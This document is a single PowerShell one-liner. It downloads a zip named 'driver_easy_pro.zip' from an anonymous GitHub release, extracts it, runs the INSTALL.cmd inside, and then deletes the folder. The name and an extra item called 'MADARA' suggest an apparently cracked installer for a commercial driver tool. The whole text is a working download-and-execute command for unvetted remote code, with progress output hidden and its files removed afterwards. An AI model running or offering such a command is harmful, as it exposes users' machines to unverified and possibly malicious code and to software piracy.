$p="C:\phwyverysad"; $z="$p\driver_easy_pro.zip"; $u="https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/driver_easy_pro.zip"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item -ItemType Directory -Path $p -Force | Out-Null}; Write-Host "Downloading..."; try{(New-Object System.Net.WebClient).DownloadFile($u,$z); if(Test-Path $z){Write-Host "Extracting..."; Expand-Archive -Path $z -DestinationPath $p -Force; foreach($i in @("INSTALL.cmd","DriverEasy_Setup.exe","MADARA")){$s=Get-ChildItem -Path $p -Filter $i -Recurse | Select-Object -First 1; if($s -and $s.FullName -ne (Join-Path $p $i)){Move-Item -Path $s.FullName -Destination (Join-Path $p $i) -Force}}; Remove-Item -Path $z -Force; $c=Join-Path $p "INSTALL.cmd"; if(Test-Path $c){Write-Host "Running Install..."; Start-Process -FilePath $c -WorkingDirectory $p -Wait}}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 2; if(Test-Path $p){Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue}; $ProgressPreference=$oldP; Write-Host "Cleanup completed."}
